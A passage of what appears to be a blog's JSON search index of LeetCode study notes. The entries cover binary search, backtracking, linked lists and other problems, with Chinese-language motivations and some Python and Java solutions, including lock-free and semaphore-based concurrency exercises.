","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["Dynamic Programming","Math","Memoization"]},{"title":"leetcode-704 - Binary Search","url":"/2021/07/leetcode-704/","content":"動機\n複習bsearch\n\nProblem\nGiven an array of integers nums which is sorted in ascending order, and an integer target, write a function to search target in nums. If target exists, then return its index. Otherwise, return -1.You must write an algorithm with O(log n) runtime complexity. Example 1:Input: nums = [-1,0,3,5,9,12], target = 9Output: 4Explanation: 9 exists in nums and its index is 4Example 2:Input: nums = [-1,0,3,5,9,12], target = 2Output: -1Explanation: 2 does not exist in nums so return -1 Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Array","Binary Search"]},{"title":"leetcode-73 - Set Matrix Zeroes","url":"/2021/07/leetcode-73/","content":"動機\n讓題我想起多allocate一塊記憶體去當dummy的手法\n但是這裡不用多allocate，而是利用matrix的第一列與第一排\n而如果第一列與第一排原本就該被處理的話，就用變數存狀態!!\n這裡的教訓是狀態與被處理的資料勢必要分開，就像loop會看cond會不會收斂，有關的index會不會收斂，遞迴的變數會不會往base case靠近，是設計時的規則!!\n\nProblem\nGiven an m x n integer matrix matrix, if an element is 0, set its entire row and column to 0's, and return the matrix.You must do it in place. Example 1:Input: matrix = [[1,1,1],[1,0,1],[1,1,1]]Output: [[1,0,1],[0,0,0],[1,0,1]]Example 2:Input: matrix = [[0,1,2,0],[3,4,5,2],[1,3,1,5]]Output: [[0,0,0,0],[0,4,5,0],[0,3,1,0]] Constraints:m == matrix.lengthn == matrix[0].length1 ","categories":["Algorithm","Leetcode","Top Interview Questions","seanprashad","CTCI-COMPLETE-LIST","Blind Curated 75"],"tags":["Array","Matrix","Hash Table"]},{"title":"leetcode-733 - Flood Fill","url":"/2021/07/leetcode-733/","content":"動機\n複習dfs\n\nProblem\nAn image is represented by an m x n integer grid image where image[i][j] represents the pixel value of the image.You are also given three integers sr, sc, and newColor. You should perform a flood fill on the image starting from the pixel image[sr][sc].To perform a flood fill, consider the starting pixel, plus any pixels connected 4-directionally to the starting pixel of the same color as the starting pixel, plus any pixels connected 4-directionally to those pixels (also with the same color), and so on. Replace the color of all of the aforementioned pixels with newColor.Return the modified image after performing the flood fill. Example 1:Input: image = [[1,1,1],[1,1,0],[1,0,1]], sr = 1, sc = 1, newColor = 2Output: [[2,2,2],[2,2,0],[2,0,1]]Explanation: From the center of the image with position (sr, sc) = (1, 1) (i.e., the red pixel), all pixels connected by a path of the same color as the starting pixel (i.e., the blue pixels) are colored with the new color.Note the bottom corner is not colored 2, because it is not 4-directionally connected to the starting pixel.Example 2:Input: image = [[0,0,0],[0,0,0]], sr = 0, sc = 0, newColor = 2Output: [[2,2,2],[2,2,2]] Constraints:m == image.lengthn == image[i].length1 ","categories":["Algorithm","Leetcode","CTCI-COMPLETE-LIST"],"tags":["Array","Matrix","Breadth-First Search","Depth-First Search"]},{"title":"leetcode-74 - Search a 2D Matrix","url":"/2021/07/leetcode-74/","content":"動機\n這種題目是不是就是saddleback就好了\n\nProblem\nWrite an efficient algorithm that searches for a value in an m x n matrix. This matrix has the following properties:Integers in each row are sorted from left to right.The first integer of each row is greater than the last integer of the previous row. Example 1:Input: matrix = [[1,3,5,7],[10,11,16,20],[23,30,34,60]], target = 3Output: trueExample 2:Input: matrix = [[1,3,5,7],[10,11,16,20],[23,30,34,60]], target = 13Output: false Constraints:m == matrix.lengthn == matrix[i].length1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Array","Matrix","Binary Search"]},{"title":"leetcode-744 - Find Smallest Letter Greater Than Target","url":"/2021/07/leetcode-744/","content":"動機\n複習upper bound\n\nProblem\nGiven a characters array letters that is sorted in non-decreasing order and a character target, return the smallest character in the array that is larger than target.Note that the letters wrap around.For example, if target == 'z' and letters == ['a', 'b'], the answer is 'a'. Example 1:Input: letters = [c,f,j], target = aOutput: cExample 2:Input: letters = [c,f,j], target = cOutput: fExample 3:Input: letters = [c,f,j], target = dOutput: fExample 4:Input: letters = [c,f,j], target = gOutput: jExample 5:Input: letters = [c,f,j], target = jOutput: c Constraints:2 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Array","Binary Search"]},{"title":"leetcode-75 - Sort Colors","url":"/2021/07/leetcode-75/","content":"動機\n有點像287一直換的解法，但後面還可以擴充成two pointer去夾\n\nProblem\nGiven an array nums with n objects colored red, white, or blue, sort them in-place so that objects of the same color are adjacent, with the colors in the order red, white, and blue.We will use the integers 0, 1, and 2 to represent the color red, white, and blue, respectively.You must solve this problem without using the library's sort function. Example 1:Input: nums = [2,0,2,1,1,0]Output: [0,0,1,1,2,2]Example 2:Input: nums = [2,0,1]Output: [0,1,2]Example 3:Input: nums = [0]Output: [0]Example 4:Input: nums = [1]Output: [1] Constraints:n == nums.length1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad"],"tags":["Array","Two Pointers","Sorting"]},{"title":"leetcode-76 - Minimum Window Substring","url":"/2021/07/leetcode-76/","content":"動機\n現在寫sliding window的風格跟以前完全不一樣\n\nProblem\nGiven two strings s and t of lengths m and n respectively, return the minimum window substring of s such that every character in t (including duplicates) is included in the window. If there is no such substring, return the empty string .The testcases will be generated such that the answer is unique.A substring is a contiguous sequence of characters within the string. Example 1:Input: s = ADOBECODEBANC, t = ABCOutput: BANCExplanation: The minimum window substring BANC includes 'A', 'B', and 'C' from string t.Example 2:Input: s = a, t = aOutput: aExplanation: The entire string s is the minimum window.Example 3:Input: s = a, t = aaOutput: Explanation: Both 'a's from t must be included in the window.Since the largest window of s only has one 'a', return empty string. Constraints:m == s.lengthn == t.length1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["String","Hash Table","Sliding Window"]},{"title":"leetcode-78 - Subsets","url":"/2021/07/leetcode-78/","content":"動機\n經典子集列舉\n\nProblem\nGiven an integer array nums of unique elements, return all possible subsets (the power set).The solution set must not contain duplicate subsets. Return the solution in any order. Example 1:Input: nums = [1,2,3]Output: [[],[1],[2],[1,2],[3],[1,3],[2,3],[1,2,3]]Example 2:Input: nums = [0]Output: [[],[0]] Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve","Top Interview Questions","seanprashad","CTCI-COMPLETE-LIST"],"tags":["Array","Bit Manipulation","Backtracking"]},{"title":"leetcode-784 - Letter Case Permutation","url":"/2021/07/leetcode-784/","content":"動機\n複習backtrack\n\nProblem\nGiven a string s, we can transform every letter individually to be lowercase or uppercase to create another string.Return a list of all possible strings we could create. You can return the output in any order. Example 1:Input: s = a1b2Output: [a1b2,a1B2,A1b2,A1B2]Example 2:Input: s = 3z4Output: [3z4,3Z4]Example 3:Input: s = 12345Output: [12345]Example 4:Input: s = 0Output: [0] Constraints:s will be a string with length between 1 and 12.s will consist only of letters or digits.\nSol\nclass Solution:    def letterCasePermutation(self, s: str,acc=&quot;&quot;) -&gt; List[str]:        if not s:            return [acc]        elif s[0].isalpha():            return self.letterCasePermutation(s[1:],acc+s[0].lower())+self.letterCasePermutation(s[1:],acc+s[0].upper())        else:            return self.letterCasePermutation(s[1:],acc+s[0])","categories":["Algorithm","Leetcode","seanprashad"],"tags":["String","Bit Manipulation","Backtracking"]},{"title":"leetcode-79 - Word Search","url":"/2021/07/leetcode-79/","content":"動機\n複習dfs\n這次寫dfs的教訓\n\n把會回傳true的放前面 (像是[[&quot;a&quot;]])，不然明明已經成功卻因為邊界檢查而失敗\n把所有失敗條件放到base case中，在寫的時候不知道是頭撞到了還是怎樣，明明沒有比對到字卻還是讓dfs繼續跑…\n\n\nProblem\nGiven an m x n grid of characters board and a string word, return true if word exists in the grid.The word can be constructed from letters of sequentially adjacent cells, where adjacent cells are horizontally or vertically neighboring. The same letter cell may not be used more than once. Example 1:Input: board = [[A,B,C,E],[S,F,C,S],[A,D,E,E]], word = ABCCEDOutput: trueExample 2:Input: board = [[A,B,C,E],[S,F,C,S],[A,D,E,E]], word = SEEOutput: trueExample 3:Input: board = [[A,B,C,E],[S,F,C,S],[A,D,E,E]], word = ABCBOutput: false Constraints:m == board.lengthn = board[i].length1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["Array","Matrix","Backtracking"]},{"title":"leetcode-796 - Rotate String","url":"/2021/07/leetcode-796/","content":"動機\nsolution總是會有有趣的解法，rotate之後的string一定是原string相接中的substring\n\nProblem\nGiven two strings s and goal, return true if and only if s can become goal after some number of shifts on s.A shift on s consists of moving the leftmost character of s to the rightmost position.For example, if s = abcde, then it will be bcdea after one shift. Example 1:Input: s = abcde, goal = cdeabOutput: trueExample 2:Input: s = abcde, goal = abcedOutput: false Constraints:1 ","categories":["Algorithm","Leetcode","CTCI-COMPLETE-LIST"],"tags":["String","String Matching"]},{"title":"leetcode-8 - String to Integer (atoi)","url":"/2021/07/leetcode-8/","content":"動機\n打從心底不想重寫這題\n\nProblem\nImplement the myAtoi(string s) function, which converts a string to a 32-bit signed integer (similar to C/C++'s atoi function).The algorithm for myAtoi(string s) is as follows:Read in and ignore any leading whitespace.Check if the next character (if not already at the end of the string) is '-' or '+'. Read this character in if it is either. This determines if the final result is negative or positive respectively. Assume the result is positive if neither is present.Read in next the characters until the next non-digit charcter or the end of the input is reached. The rest of the string is ignored.Convert these digits into an integer (i.e. 123 -> 123, 0032 -> 32). If no digits were read, then the integer is 0. Change the sign as necessary (from step 2).If the integer is out of the 32-bit signed integer range [-231, 231 - 1], then clamp the integer so that it remains in the range. Specifically, integers less than -231 should be clamped to -231, and integers greater than 231 - 1 should be clamped to 231 - 1.Return the integer as the final result.Note:Only the space character ' ' is considered a whitespace character.Do not ignore any characters other than the leading whitespace or the rest of the string after the digits. Example 1:Input: s = 42Output: 42Explanation: The underlined characters are what is read in, the caret is the current reader position.Step 1: 42 (no characters read because there is no leading whitespace)         ^Step 2: 42 (no characters read because there is neither a '-' nor '+')         ^Step 3: 42 (42 is read in)           ^The parsed integer is 42.Since 42 is in the range [-231, 231 - 1], the final result is 42.Example 2:Input: s =    -42Output: -42Explanation:Step 1:    -42 (leading whitespace is read and ignored)            ^Step 2:    -42 ('-' is read, so the result should be negative)             ^Step 3:    -42 (42 is read in)               ^The parsed integer is -42.Since -42 is in the range [-231, 231 - 1], the final result is -42.Example 3:Input: s = 4193 with wordsOutput: 4193Explanation:Step 1: 4193 with words (no characters read because there is no leading whitespace)         ^Step 2: 4193 with words (no characters read because there is neither a '-' nor '+')         ^Step 3: 4193 with words (4193 is read in; reading stops because the next character is a non-digit)             ^The parsed integer is 4193.Since 4193 is in the range [-231, 231 - 1], the final result is 4193.Example 4:Input: s = words and 987Output: 0Explanation:Step 1: words and 987 (no characters read because there is no leading whitespace)         ^Step 2: words and 987 (no characters read because there is neither a '-' nor '+')         ^Step 3: words and 987 (reading stops immediately because there is a non-digit 'w')         ^The parsed integer is 0 because no digits were read.Since 0 is in the range [-231, 231 - 1], the final result is 0.Example 5:Input: s = -91283472332Output: -2147483648Explanation:Step 1: -91283472332 (no characters read because there is no leading whitespace)         ^Step 2: -91283472332 ('-' is read, so the result should be negative)          ^Step 3: -91283472332 (91283472332 is read in)                     ^The parsed integer is -91283472332.Since -91283472332 is less than the lower bound of the range [-231, 231 - 1], the final result is clamped to -231 = -2147483648.  Constraints:0 ","categories":["Algorithm","Leetcode","60 questions to solve","Top Interview Questions"],"tags":["String"]},{"title":"leetcode-81 - Search in Rotated Sorted Array II","url":"/2021/07/leetcode-81/","content":"動機\n這題是33的follow-up\n如果多了重複怎麼辦?\n\nProblem\nThere is an integer array nums sorted in non-decreasing order (not necessarily with distinct values).Before being passed to your function, nums is rotated at an unknown pivot index k (0 ","categories":["Algorithm","Leetcode","seanprashad","CTCI-COMPLETE-LIST"],"tags":["Array","Binary Search"]},{"title":"leetcode-82 - Remove Duplicates from Sorted List II","url":"/2021/07/leetcode-82/","content":"動機\n用prev代表重複開始前的node\n也看一下，83作對比\n\nProblem\nGiven the head of a sorted linked list, delete all nodes that have duplicate numbers, leaving only distinct numbers from the original list. Return the linked list sorted as well. Example 1:Input: head = [1,2,3,3,4,4,5]Output: [1,2,5]Example 2:Input: head = [1,1,1,2,3]Output: [2,3] Constraints:The number of nodes in the list is in the range [0, 300].-100 ","categories":["Algorithm","Leetcode","60 questions to solve"],"tags":["Two Pointers","Linked List"]},{"title":"leetcode-83 - Remove Duplicates from Sorted List","url":"/2021/07/leetcode-83/","content":"動機\n用prev代表重複的第一個node\n也看一下，82作對比\n\nProblem\nGiven the head of a sorted linked list, delete all duplicates such that each element appears only once. Return the linked list sorted as well. Example 1:Input: head = [1,1,2]Output: [1,2]Example 2:Input: head = [1,1,2,3,3]Output: [1,2,3] Constraints:The number of nodes in the list is in the range [0, 300].-100 ","categories":["Algorithm","Leetcode","60 questions to solve","seanprashad","CTCI-COMPLETE-LIST"],"tags":["Linked List"]},{"title":"leetcode-84 - Largest Rectangle in Histogram","url":"/2021/07/leetcode-84/","content":"動機\nMonotonic Stack在pop時當下的狀態是\n1 2 3 .left. 7 .right. 2\nright的數字大小一定是大於7!!\nleft的數字一定是等於7\n這樣就可以形成一個閉區間，這也讓這題變成經典題\n\nProblem\nGiven an array of integers heights representing the histogram's bar height where the width of each bar is 1, return the area of the largest rectangle in the histogram. Example 1:Input: heights = [2,1,5,6,2,3]Output: 10Explanation: The above is a histogram where width of each bar is 1.The largest rectangle is shown in the red area, which has an area = 10 units.Example 2:Input: heights = [2,4]Output: 4 Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions"],"tags":["Array","Stack","Monotonic Stack"]},{"title":"leetcode-844 - Backspace String Compare","url":"/2021/07/leetcode-844/","content":"動機\n複習stack，但第二個解法很漂亮\n\nProblem\nGiven two strings s and t, return true if they are equal when both are typed into empty text editors. '#' means a backspace character.Note that after backspacing an empty text, the text will continue empty. Example 1:Input: s = ab#c, t = ad#cOutput: trueExplanation: Both s and t become ac.Example 2:Input: s = ab##, t = c#d#Output: trueExplanation: Both s and t become .Example 3:Input: s = a##c, t = #a#cOutput: trueExplanation: Both s and t become c.Example 4:Input: s = a#c, t = bOutput: falseExplanation: s becomes c while t becomes b. Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["String","Stack","Two Pointers","Simulation"]},{"title":"leetcode-85 - Maximal Rectangle","url":"/2021/07/leetcode-85/","content":"動機\n不同的DP不同的難易度\n\nProblem\nGiven a rows x cols binary matrix filled with 0's and 1's, find the largest rectangle containing only 1's and return its area. Example 1:Input: matrix = [[1,0,1,0,0],[1,0,1,1,1],[1,1,1,1,1],[1,0,0,1,0]]Output: 6Explanation: The maximal rectangle is shown in the above picture.Example 2:Input: matrix = []Output: 0Example 3:Input: matrix = [[0]]Output: 0Example 4:Input: matrix = [[1]]Output: 1Example 5:Input: matrix = [[0,0]]Output: 0 Constraints:rows == matrix.lengthcols == matrix[i].length0 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions"],"tags":["Dynamic Programming","Array","Matrix","Stack","Monotonic Stack"]},{"title":"leetcode-86 - Partition List","url":"/2021/07/leetcode-86/","content":"動機\n直接往後塞\n\nProblem\nGiven the head of a linked list and a value x, partition it such that all nodes less than x come before nodes greater than or equal to x.You should preserve the original relative order of the nodes in each of the two partitions. Example 1:Input: head = [1,4,3,2,5,2], x = 3Output: [1,2,2,4,3,5]Example 2:Input: head = [2,1], x = 2Output: [1,2] Constraints:The number of nodes in the list is in the range [0, 200].-100 ","categories":["Algorithm","Leetcode","CTCI-COMPLETE-LIST"],"tags":["Two Pointers","Linked List"]},{"title":"leetcode-863 - All Nodes Distance K in Binary Tree","url":"/2021/07/leetcode-863/","content":"動機\n轉成graph錯了嗎\n\nProblem\nGiven the root of a binary tree, the value of a target node target, and an integer k, return an array of the values of all nodes that have a distance k from the target node.You can return the answer in any order. Example 1:Input: root = [3,5,1,6,2,0,8,null,null,7,4], target = 5, k = 2Output: [7,4,1]Explanation: The nodes that are a distance 2 from the target node (with value 5) have values 7, 4, and 1.Example 2:Input: root = [1], target = 1, k = 3Output: [] Constraints:The number of nodes in the tree is in the range [1, 500].0 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Breadth-First Search","Depth-First Search","Binary Tree","Tree"]},{"title":"leetcode-87 - Scramble String","url":"/2021/07/leetcode-87/","content":"動機\n不同的DP不同的難易度\n\nProblem\nWe can scramble a string s to get a string t using the following algorithm:If the length of the string is 1, stop.If the length of the string is > 1, do the following:Split the string into two non-empty substrings at a random index, i.e., if the string is s, divide it to x and y where s = x + y.Randomly decide to swap the two substrings or to keep them in the same order. i.e., after this step, s may become s = x + y or s = y + x.Apply step 1 recursively on each of the two substrings x and y.Given two strings s1 and s2 of the same length, return true if s2 is a scrambled string of s1, otherwise, return false. Example 1:Input: s1 = great, s2 = rgeatOutput: trueExplanation: One possible scenario applied on s1 is:great --> gr/eat // divide at random index.gr/eat --> gr/eat // random decision is not to swap the two substrings and keep them in order.gr/eat --> g/r / e/at // apply the same algorithm recursively on both substrings. divide at ranom index each of them.g/r / e/at --> r/g / e/at // random decision was to swap the first substring and to keep the second substring in the same order.r/g / e/at --> r/g / e/ a/t // again apply the algorithm recursively, divide at to a/t.r/g / e/ a/t --> r/g / e/ a/t // random decision is to keep both substrings in the same order.The algorithm stops now and the result string is rgeat which is s2.As there is one possible scenario that led s1 to be scrambled to s2, we return true.Example 2:Input: s1 = abcde, s2 = caebdOutput: falseExample 3:Input: s1 = a, s2 = aOutput: true Constraints:s1.length == s2.length1 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","String"]},{"title":"leetcode-876 - Middle of the Linked List","url":"/2021/07/leetcode-876/","content":"動機\n複習linked list找中點\n\nProblem\nGiven the head of a singly linked list, return the middle node of the linked list.If there are two middle nodes, return the second middle node. Example 1:Input: head = [1,2,3,4,5]Output: [3,4,5]Explanation: The middle node of the list is node 3.Example 2:Input: head = [1,2,3,4,5,6]Output: [4,5,6]Explanation: Since the list has two middle nodes with values 3 and 4, we return the second one. Constraints:The number of nodes in the list is in the range [1, 100].1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Two Pointers","Linked List"]},{"title":"leetcode-88 - Merge Sorted Array","url":"/2021/07/leetcode-88/","content":"動機\n從背後來就是easy，從正面來就是地獄\n\nProblem\nYou are given two integer arrays nums1 and nums2, sorted in non-decreasing order, and two integers m and n, representing the number of elements in nums1 and nums2 respectively.Merge nums1 and nums2 into a single array sorted in non-decreasing order.The final sorted array should not be returned by the function, but instead be stored inside the array nums1. To accommodate this, nums1 has a length of m + n, where the first m elements denote the elements that should be merged, and the last n elements are set to 0 and should be ignored. nums2 has a length of n. Example 1:Input: nums1 = [1,2,3,0,0,0], m = 3, nums2 = [2,5,6], n = 3Output: [1,2,2,3,5,6]Explanation: The arrays we are merging are [1,2,3] and [2,5,6].The result of the merge is [1,2,2,3,5,6] with the underlined elements coming from nums1.Example 2:Input: nums1 = [1], m = 1, nums2 = [], n = 0Output: [1]Explanation: The arrays we are merging are [1] and [].The result of the merge is [1].Example 3:Input: nums1 = [0], m = 0, nums2 = [1], n = 1Output: [1]Explanation: The arrays we are merging are [] and [1].The result of the merge is [1].Note that because m = 0, there are no elements in nums1. The 0 is only there to ensure the merge result can fit in nums1. Constraints:nums1.length == m + nnums2.length == n0 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["Array","Two Pointers","Sorting"]},{"title":"leetcode-90 - Subsets II","url":"/2021/07/leetcode-90/","content":"動機\nbacktrack與重複\nfilter與next是不是有bug阿\n\nProblem\nGiven an integer array nums that may contain duplicates, return all possible subsets (the power set).The solution set must not contain duplicate subsets. Return the solution in any order. Example 1:Input: nums = [1,2,2]Output: [[],[1],[1,2],[1,2,2],[2],[2,2]]Example 2:Input: nums = [0]Output: [[],[0]] Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Array","Bit Manipulation","Backtracking"]},{"title":"leetcode-91 - Decode Ways","url":"/2021/07/leetcode-91/","content":"動機\n有backtrack的味道，但因為要往前看一格就變成dp\n\nProblem\nA message containing letters from A-Z can be encoded into numbers using the following mapping:'A' -> 1'B' -> 2...'Z' -> 26To decode an encoded message, all the digits must be grouped then mapped back into letters using the reverse of the mapping above (there may be multiple ways). For example, 11106 can be mapped into:AAJF with the grouping (1 1 10 6)KJF with the grouping (11 10 6)Note that the grouping (1 11 06) is invalid because 06 cannot be mapped into 'F' since 6 is different from 06.Given a string s containing only digits, return the number of ways to decode it.The answer is guaranteed to fit in a 32-bit integer. Example 1:Input: s = 12Output: 2Explanation: 12 could be decoded as AB (1 2) or L (12).Example 2:Input: s = 226Output: 3Explanation: 226 could be decoded as BZ (2 26), VF (22 6), or BBF (2 2 6).Example 3:Input: s = 0Output: 0Explanation: There is no character that is mapped to a number starting with 0.The only valid mappings with 0 are 'J' -> 10 and 'T' -> 20, neither of which start with 0.Hence, there are no valid ways to decode this since all digits need to be mapped.Example 4:Input: s = 06Output: 0Explanation: 06 cannot be mapped to F because of the leading zero (6 is different from 06). Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["Dynamic Programming","String"]},{"title":"leetcode-92 - Reverse Linked List II","url":"/2021/07/leetcode-92/","content":"動機\n就reverse\n\nProblem\nGiven the head of a singly linked list and two integers left and right where left ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Linked List"]},{"title":"leetcode-929 - Unique Email Addresses","url":"/2021/07/leetcode-929/","content":"動機\n這是閱讀測驗嗎\n\nProblem\nEvery valid email consists of a local name and a domain name, separated by the '@' sign. Besides lowercase letters, the email may contain one or more '.' or '+'.For example, in alice@leetcode.com, alice is the local name, and leetcode.com is the domain name.If you add periods '.' between some characters in the local name part of an email address, mail sent there will be forwarded to the same address without dots in the local name. Note that this rule does not apply to domain names.For example, alice.z@leetcode.com and alicez@leetcode.com forward to the same email address.If you add a plus '+' in the local name, everything after the first plus sign will be ignored. This allows certain emails to be filtered. Note that this rule does not apply to domain names.For example, m.y+name@email.com will be forwarded to my@email.com.It is possible to use both of these rules at the same time.Given an array of strings emails where we send one email to each email[i], return the number of different addresses that actually receive mails. Example 1:Input: emails = [test.email+alex@leetcode.com,test.e.mail+bob.cathy@leetcode.com,testemail+david@lee.tcode.com]Output: 2Explanation: testemail@leetcode.com and testemail@lee.tcode.com actually receive mails.Example 2:Input: emails = [a@leetcode.com,b@leetcode.com,c@leetcode.com]Output: 3 Constraints:1 ","categories":["Algorithm","Leetcode","60 questions to solve"],"tags":["String","Array","Hash Table"]},{"title":"leetcode-932 - Beautiful Array","url":"/2021/07/leetcode-932/","content":"動機\n很玄，這沒看解答會知道?\n\nProblem\nAn array nums of length n is beautiful if:nums is a permutation of the integers in the range [1, n].For every 0 ","categories":["Algorithm","Leetcode"],"tags":["Array","Math","Divide and Conquer"]},{"title":"leetcode-94 - Binary Tree Inorder Traversal","url":"/2021/07/leetcode-94/","content":"動機\n中序的英文是inorder，一開始寫以為是前序\n\nProblem\nGiven the root of a binary tree, return the inorder traversal of its nodes' values. Example 1:Input: root = [1,null,2,3]Output: [1,3,2]Example 2:Input: root = []Output: []Example 3:Input: root = [1]Output: [1]Example 4:Input: root = [1,2]Output: [2,1]Example 5:Input: root = [1,null,2]Output: [1,2] Constraints:The number of nodes in the tree is in the range [0, 100].-100 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions"],"tags":["Depth-First Search","Stack","Binary Tree","Tree"]},{"title":"leetcode-96 - Unique Binary Search Trees","url":"/2021/07/leetcode-96/","content":"動機\n當成range，就可以去二分了\n\nProblem\nGiven an integer n, return the number of structurally unique BST's (binary search trees) which has exactly n nodes of unique values from 1 to n. Example 1:Input: n = 3Output: 5Example 2:Input: n = 1Output: 1 Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions"],"tags":["Dynamic Programming","Math","Binary Tree","Tree","Binary Search Tree"]},{"title":"leetcode-98 - Validate Binary Search Tree","url":"/2021/07/leetcode-98/","content":"動機\n當初還想著怎麼看node…\n\nProblem\nGiven the root of a binary tree, determine if it is a valid binary search tree (BST).A valid BST is defined as follows:The left subtree of a node contains only nodes with keys less than the node's key.The right subtree of a node contains only nodes with keys greater than the node's key.Both the left and right subtrees must also be binary search trees. Example 1:Input: root = [2,1,3]Output: trueExample 2:Input: root = [5,1,4,null,null,3,6]Output: falseExplanation: The root node's value is 5 but its right child's value is 4. Constraints:The number of nodes in the tree is in the range [1, 104].-231 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve","Top Interview Questions","seanprashad","CTCI-COMPLETE-LIST","Blind Curated 75"],"tags":["Depth-First Search","Binary Tree","Tree","Binary Search Tree"]},{"title":"leetcode-Concurrency","url":"/2021/07/leetcode-Concurrency/","content":"動機\n解解LC的題目\n\nlockfree\n只要一讀一寫就ok了，之後就是搭配while(cond) &#123; Thread.yield(); &#125;\n但事情沒這麼簡單\n\n修改變數時要加上條件(前提)，不要無條件的write，以保證一讀一寫\nwrite不要與其他東西混用\n\n\n像1116的printNumber.accept(i++);，會錯\n\n\n在多thread協作的場景下，lockfree很沒效率，見1117\n\n1114\nclass Foo &#123;    private volatile int n = 0;    public Foo() &#123;            &#125;    public void first(Runnable printFirst) throws InterruptedException &#123;        while (n &lt; 1) &#123;            printFirst.run();            n = 1;        &#125;    &#125;    public void second(Runnable printSecond) throws InterruptedException &#123;        while (n &lt; 2) &#123;            if (n == 1) &#123;                printSecond.run();                n++;            &#125;            Thread.yield();        &#125;    &#125;    public void third(Runnable printThird) throws InterruptedException &#123;        while (n &lt; 3) &#123;            if (n == 2) &#123;                printThird.run();                n++;            &#125;            Thread.yield();        &#125;    &#125;&#125;\n1115\nclass FooBar &#123;    private int n;    private volatile boolean pFoo = true;    public FooBar(int n) &#123;        this.n = n;    &#125;    public void foo(Runnable printFoo) throws InterruptedException &#123;                for (int i = 0; i &lt; n; i++) &#123;            if (pFoo) &#123;                // printFoo.run() outputs &quot;foo&quot;. Do not change or remove this line.        \t    printFoo.run();                pFoo = false;            &#125; else &#123;                Thread.yield();                i--;            &#125;        &#125;    &#125;    public void bar(Runnable printBar) throws InterruptedException &#123;                for (int i = 0; i &lt; n; i++) &#123;            if (!pFoo) &#123;                // printBar.run() outputs &quot;bar&quot;. Do not change or remove this line.        \t    printBar.run();                pFoo = true;            &#125; else &#123;                Thread.yield();                i--;            &#125;        &#125;    &#125;&#125;\n1116\nclass ZeroEvenOdd &#123;    private final int n;    private volatile int i = 1;    private volatile boolean need_zero = false;        public ZeroEvenOdd(int n) &#123;        this.n = n;    &#125;    public void genOneZero() &#123;        need_zero = true;        while (need_zero) &#123; Thread.yield(); &#125;    &#125;    // printNumber.accept(x) outputs &quot;x&quot;, where x is an integer.    public void zero(IntConsumer printNumber) throws InterruptedException &#123;        while (i &lt;= n) &#123;            if (need_zero) &#123;                printNumber.accept(0);                need_zero = false;            &#125;            Thread.yield();        &#125;    &#125;    public void even(IntConsumer printNumber) throws InterruptedException &#123;        while (i &lt;= n) &#123;            if (i % 2 == 0 &amp;&amp; !need_zero) &#123;                genOneZero();                // printNumber.accept(i++); NO!!!!                printNumber.accept(i);                i++;            &#125; else &#123;                Thread.yield();            &#125;        &#125;    &#125;    public void odd(IntConsumer printNumber) throws InterruptedException &#123;        while (i &lt;= n) &#123;            if (i % 2 != 0 &amp;&amp; !need_zero) &#123;                genOneZero();                printNumber.accept(i);                i++;            &#125; else &#123;                Thread.yield();            &#125;        &#125;    &#125;&#125;\n1195\nclass FizzBuzz &#123;    private final int end;    private volatile int n = 1;    public FizzBuzz(int n) &#123;        this.end = n;    &#125;    // printFizz.run() outputs &quot;fizz&quot;.    public void fizz(Runnable printFizz) throws InterruptedException &#123;        while (n &lt;= end) &#123;            if (n % 3 == 0 &amp;&amp; n % 5 != 0) &#123;                printFizz.run();                n++;            &#125; else &#123;                Thread.yield();            &#125;        &#125;    &#125;    // printBuzz.run() outputs &quot;buzz&quot;.    public void buzz(Runnable printBuzz) throws InterruptedException &#123;        while (n &lt;= end) &#123;            if (n % 5 == 0 &amp;&amp; n % 3 != 0) &#123;                printBuzz.run();                n++;            &#125; else &#123;                Thread.yield();            &#125;        &#125;    &#125;    // printFizzBuzz.run() outputs &quot;fizzbuzz&quot;.    public void fizzbuzz(Runnable printFizzBuzz) throws InterruptedException &#123;        while (n &lt;= end) &#123;            if (n % 3 == 0 &amp;&amp; n % 5 == 0) &#123;                printFizzBuzz.run();                n++;            &#125; else &#123;                Thread.yield();            &#125;        &#125;    &#125;    // printNumber.accept(x) outputs &quot;x&quot;, where x is an integer.    public void number(IntConsumer printNumber) throws InterruptedException &#123;        while (n &lt;= end) &#123;            if (n % 3 != 0 &amp;&amp; n % 5 != 0) &#123;                printNumber.accept(n);                n++;            &#125; else &#123;                Thread.yield();            &#125;        &#125;    &#125;&#125;\n1117\nsemaphore\n兩個H後才有一個O，對應到兩個semaphore\n先放H再放O\nclass H2O &#123;    private Semaphore h = new Semaphore(2), o = new Semaphore(0);    public void hydrogen(Runnable releaseHydrogen) throws InterruptedException &#123;        h.acquire();        releaseHydrogen.run();        o.release();    &#125;    public void oxygen(Runnable releaseOxygen) throws InterruptedException &#123;        o.acquire(2);        releaseOxygen.run();        h.release(2);    &#125;&#125;\nsynchronized (blockfree)\nsynchronized中不會reorder且具atomic\n應該要上volatile，但我把volatile拿掉也是AC了!!\nclass H2O &#123;    private int h = 2, o = 0;    private Integer a=1,b=2;    public void hydrogen(Runnable releaseHydrogen) throws InterruptedException &#123;        synchronized(a) &#123;            while (h &lt;= 